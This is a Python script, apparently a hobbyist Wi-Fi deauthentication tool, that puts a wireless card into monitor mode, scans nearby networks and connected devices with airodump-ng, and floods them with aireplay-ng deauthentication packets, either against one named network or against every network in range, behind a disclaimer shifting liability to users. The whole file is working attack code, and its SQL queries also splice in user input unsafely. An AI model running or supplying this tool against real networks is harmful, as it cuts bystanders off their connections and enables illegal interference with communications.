'''Important Note:
It is illegal to monitor and / or record interpersonal communication without providing the necessary procedures, and committing this act constitutes a crime.

The users are deemed to have accepted the legal liabilities, material, moral and any possible damages that may arise from the legal and illegal use of this tool, and the developers cannot be held responsible in any way.

Any damages and liabilities arising from the use of this code belong to the users.'''

import subprocess
import os
import time
import sqlite3
import optparse

CRED = '\033[41m'
CEND = '\033[0m'

text = f"""                     ▄▀░░▌
                   ▄▀▐░░░▌
                ▄▀▀▒▐▒░░░▌
     ▄▀▀▄   ▄▄▀▀▒▒▒▒▌▒▒░░▌
    ▐▒░░░▀▄▀▒▒▒▒▒▒▒▒▒▒▒▒▒█
    ▌▒░░░░▒▀▄▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄
   ▐▒░░░░░▒▒▒▒▒▒▒▒▒▌▒▐▒▒▒▒▒▀▄
    ▌▀▄░░▒▒▒▒▒▒▒▒▐▒▒▒▌▒▌▒▄▄▒▒▐
   ▌▌▒▒▀▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▒█▄█▌▒▒▌
 ▄▀▒▐▒▒▒▒▒▒▒▒▒▒▒▄▀█▌▒▒▒▒▒▀▀▒▒▐░░░▄
▀▒▒▒▒▌▒▒▒▒▒▒▒▄▒▐███▌▄▒▒▒▒▒▒▒▄▀▀▀▀
▒▒▒▒▒▐▒▒▒▒▒▄▀▒▒▒▀▀▀▒▒▒▒▄█▀░░▒▌▀▀▄▄
▒▒▒▒▒▒█▒▄▄▀▒▒▒▒▒▒▒▒▒▒▒░░▐▒▀▄▀▄░░░░▀
▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▄▒▒▒▒▄▀▒▒▒▌░░▀▄
▒▒▒▒▒▒▒▒▀▄▒▒▒▒▒▒▒▒▀▀▀▀▒▒▒▄▀     ▂▃▅▇█▓▒░۩۞۩ jammerDEAUTHway ۩۞۩░▒▓█▇▅▃▂"""
print(text)
print("\nHi jumppy :>\n\n")


def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t","--target", dest="targetname", type=str, help="Specific target name to be attacked!\nIf all then do not use this parameter!")
    parse_object.add_option("-n","--number", dest="number_of_packages",type=int, help="How many packages will be sent to the target(s)!(0=unlimited)")

    return parse_object.parse_args()

def getInterfaceName():
    process_of_interface_output = subprocess.getoutput("iw dev | grep Interface")
    interface_name = process_of_interface_output.split("\n")[0]  # Searching for interface name
    interface_name = interface_name[11:]  # Getting the name only

    return interface_name

def changeMod(interface_name):
    os.system("airmon-ng start " + interface_name)

def isMonitor():
    process_of_type_output = subprocess.getoutput("iw dev | grep type")
    type_of_card = process_of_type_output.split("\n")[0]
    type_of_card = type_of_card[7:]
    print(type_of_card)
    if type_of_card == 'monitor':
        return True
    if type_of_card == 'managed':
        print("\nYou may want change your type of network card manually.")
        return False

def scanNetwork(interface_name_monitor):
    print("Scanning...")
    files_first = os.listdir("./firstScan")
    number_of_files_first = len(files_first)
    os.system(f"timeout -s 9 10 airodump-ng -w ./firstScan/output_of_scan{number_of_files_first} --output-format kismet.csv {interface_name_monitor}")

def scanAllnetwork(interface_name_monitor):
    print("Scanning...")
    files_allf = os.listdir("./allScan/allfScan")
    number_of_files_allf = len(files_allf)
    os.system(f"timeout -s 9 10 airodump-ng -w ./allScan/allfScan/output_of_scan{number_of_files_allf} --output-format kismet.csv {interface_name_monitor}")

def getTargets(db_name):

    conn = sqlite3.connect(db_name)
    c = conn.cursor()

    macs = f"""SELECT BSSID FROM dump"""
    c.execute(macs)
    macs = c.fetchall()

    channels = f"SELECT Channel FROM dump"
    c.execute(channels)
    channels = c.fetchall()

    return macs, channels

def getData(db_name):
    conn = sqlite3.connect(db_name)
    c = conn.cursor()

    bssid = f"""SELECT bssid FROM dump WHERE ESSID ='{targetname}'"""
    c.execute(bssid)
    bssid = c.fetchone()[0]

    channel = f"""SELECT channel FROM dump WHERE ESSID ='{targetname}'"""
    c.execute(channel)
    channel = c.fetchone()[0]

    return bssid, channel

def scanDevices(interface_name_monitor, bssid, channel):
    print("Scanning...")
    channel = str(channel)
    files_second = os.listdir("./secondScan")
    number_of_files_second = len(files_second)
    os.system(f"timeout -s 9 15 airodump-ng -c {channel} --bssid {bssid} -w ./secondScan/output_of_scan{number_of_files_second} --output-format csv {interface_name_monitor}")

def scanDevicesforAll(interface_name_monitor, bssid, channel):
    print("Scanning...")
    channel = str(channel)
    files_alls = os.listdir("./allScan/allsScan")
    number_of_files_alls = len(files_alls)
    os.system(f"timeout -s 9 15 airodump-ng -c {channel} --bssid {bssid} -w ./allScan/allsScan/output_of_scan{number_of_files_alls} --output-format csv {interface_name_monitor}")

def getWIFIname(db_name):
    conn = sqlite3.connect(db_name)
    c = conn.cursor()
    names = f"""SELECT ESSID FROM dump"""
    c.execute(names)
    names = c.fetchall()
    return names

def getMACs(db_name):
    conn = sqlite3.connect(db_name)
    c = conn.cursor()
    macs = f"""SELECT StationMAC FROM dump"""
    c.execute(macs)
    macs = c.fetchall()

    return macs

def drop(device_mac, network_mac, interface_name_monitor):
    print(device_mac)
    os.system(f"gnome-terminal -- aireplay-ng -0 {number_of_packages} -a {network_mac} -c {device_mac} --ignore-negative-one {interface_name_monitor}")

def clean():
    os.system("rm -rf firstScan/o*")
    os.system("rm -rf secondScan/o*")
    os.system("rm -rf allScan/allfScan/o*")
    os.system("rm -rf allScan/allsScan/o*")

def re_eneable_managedmode():
    os.system(f"airodump-ng stop {interface_name_monitor}")


(user_input,arguments) = get_user_input()
targetname, number_of_packages = user_input.targetname, user_input.number_of_packages
    
print(f"Options:\nTarget: {targetname} (None=all)\nPackage quantity: {number_of_packages}")
print(CRED + "\nAre you sure to start the attack with the above settings?[Y/n]" + CEND)
sure = input("\n: ")
s = ["y", "Y", ""]
if sure not in s:
    exit()

clean()

interface_name = getInterfaceName()
print(interface_name)
changeMod(interface_name)

if isMonitor():
    print("The mode has changed to monitor instead of managed.")
    interface_name_monitor = interface_name

    if targetname == None:
        print("All WIFI that the WIFI card can reach have been chosen as target!")
        time.sleep(1)
        # ALL SCAN
        scanAllnetwork(interface_name_monitor)
        files_allf = os.listdir("./allScan/allfScan")
        number_of_files_allf = len(files_allf)
        os.system(f"./kismet2sqlite.sh ./allScan/allfScan/output_of_scan{number_of_files_allf - 1}-01.kismet.csv")
        print("Creating db...")
        time.sleep(3)
        os.system(f"rm -r ./allScan/allfScan/output_of_scan{number_of_files_allf - 1}-01.kismet.csv")

        db_name = f"./allScan/allfScan/output_of_scan{number_of_files_allf - 1}-01.kismet.csv.db"
        targets, channels = getTargets(db_name)
        names = getWIFIname(db_name)

        for i in range(0, len(targets)):

            name = str(names[i])
            name = name[2:-3]
            print(CRED+ name + CEND)
            bssid = str(targets[i])
            bssid = bssid[2:19]
            print(bssid)
            channel = str(channels[i])
            channel = channel[1:-2]
            print(channel)

            scanDevicesforAll(interface_name_monitor, bssid, channel)
            files_alls = os.listdir("./allScan/allsScan")
            number_of_files_alls = len(files_alls)
            os.system(f"./kismet3sqlite.sh ./allScan/allsScan/output_of_scan{number_of_files_alls - 1}-01.csv")
            print("Creating db...")
            time.sleep(3)
            os.system(f"rm -r ./allScan/allsScan/output_of_scan{number_of_files_alls - 1}-01.csv")

            db_name = f"./allScan/allsScan/output_of_scan{number_of_files_alls - 1}-01.csv.db"
            macs = getMACs(db_name)
            print(macs)
            counter = 0
            for mac in macs:
                mac = str(mac)
                mac = mac[2:19]
                print(CRED + mac + CEND)
                if len(mac) == 17:
                    drop(mac, bssid, interface_name_monitor)
                    time.sleep(5)
                    counter += 1
                if len(macs) == 1:
                    print(CRED + "\nThere is not any devices connected to the WIFI!\nOr you are not close enough to the WIFI!" + CEND + "\n\n\n\n\n\n")
                    time.sleep(1)
        if counter == len(macs):
            print(CRED + "All devices have been dropped from the WIFI you chose!" + CEND + "\nHAVE FUN :>")
        re_enable = input("Wanna re-enable managed mode?[Y/n]")
        if re_enable in s:
            re_eneable_managedmode()
            print("Setting your wifi card to its old settings.")
            time.sleep(3)
            print("Your network can usable now! Have a good one c:")

    else:
        print(f"'{targetname}' has been chosen as target!")
        time.sleep(1)
        ## FIRST SCAN
        scanNetwork(interface_name_monitor)
        files_first = os.listdir("./firstScan")
        number_of_files_first = len(files_first)
        os.system(f"./kismet2sqlite.sh ./firstScan/output_of_scan{number_of_files_first - 1}-01.kismet.csv")
        print("Creating db...")
        time.sleep(3)
        os.system(f"rm -r ./firstScan/output_of_scan{number_of_files_first - 1}-01.kismet.csv")

        db_name = f"./firstScan/output_of_scan{number_of_files_first - 1}-01.kismet.csv.db"
        bssid, channel = getData(db_name)
        print(bssid, channel)

        # SECOND SCAN
        scanDevices(interface_name_monitor, bssid, channel)
        files_second = os.listdir("./secondScan")
        number_of_files_second = len(files_second)
        os.system(f"./kismet3sqlite.sh ./secondScan/output_of_scan{number_of_files_second - 1}-01.csv")
        print("Creating db...")
        time.sleep(3)
        os.system(f"rm -r ./secondScan/output_of_scan{number_of_files_second - 1}-01.csv")

        db_name = f"./secondScan/output_of_scan{number_of_files_second - 1}-01.csv.db"
        macs = getMACs(db_name)
        print(macs)
        counter = 0

        for mac in macs:
            mac = str(mac)
            mac = mac[2:19]
            print(CRED + mac + CEND)
            if len(mac) == 17:
                drop(mac, bssid, interface_name_monitor)
                time.sleep(5)
                counter += 1
            if len(macs) == 1:
                print(CRED + "\nThere is not any devices connected to the WIFI!\nOr you are not close enough to the WIFI!" + CEND + "\n\n\n\n\n\n")
                time.sleep(1)
        if counter == len(macs):
            print(CRED + "All devices have been dropped from the WIFI you chose!" + CEND + "\nHAVE FUN :>")
        re_enable = input("Wanna re-enable managed mode?[Y/n]")
        if re_enable in s:
            re_eneable_managedmode()
            print("Setting your wifi card to its old settings.")
            time.sleep(3)
            print("Your network can usable now! Have a good one c:")

else:
    print("The mode has NOT changed to monitor instead of managed." + CRED +"\nYou should run it as root!" + CEND)

